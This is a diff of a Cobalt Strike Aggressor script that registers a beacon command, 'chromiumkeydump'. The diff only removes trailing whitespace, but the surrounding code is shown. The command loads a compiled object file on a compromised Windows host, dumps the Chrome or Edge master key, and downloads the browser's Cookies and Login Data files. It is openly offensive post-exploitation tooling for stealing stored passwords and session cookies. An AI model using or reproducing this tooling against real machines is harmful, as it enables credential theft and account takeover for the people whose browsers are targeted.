@@ -6,7 +6,7 @@ alias chromiumkeydump {
     $arch = binfo($bid, "barch");
     $username = split(" ", binfo($bid, "user"))[0];
     $path = iff(-istrue $4, $4, "c:\\Users\\".$username."\\AppData\\Local\\");
-    
+
 	if ($arch eq "x64") {
         $handle = openf(script_resource("./bin/ChromiumKeyDump.x64.o"));
         $data = readb($handle, -1);
@@ -16,7 +16,7 @@ alias chromiumkeydump {
         $data = readb($handle, -1);
         closef($handle);
     }
-    
+
     if ($browser eq "chrome") {
         $browser_type = 0;
         $browser_path = $path."Google\\Chrome";
@@ -50,7 +50,7 @@ alias chromiumkeydump {
     }
 }
 
-beacon_command_register("chromiumkeydump", "Dump Chrome/Edge Masterkey and download Cookies/LoginData", 
+beacon_command_register("chromiumkeydump", "Dump Chrome/Edge Masterkey and download Cookies/LoginData",
 "\nUsage: chromiumkeydump [edge|chrome] [argument(required)] [ChromePath(optional)]\n
                 Arguments       Description
                 ---------       -----------
@@ -58,7 +58,7 @@ beacon_command_register("chromiumkeydump", "Dump Chrome/Edge Masterkey and downl
                 cookies         Download Chrome Cookies file
                 logindata       Download Chrome Login Data file
                 all             Dump Masterkey and download files
-                
+
                 ChromePath      Path to custom installation directory
                                 !Set the path to where the [User Data] folder is located!
 
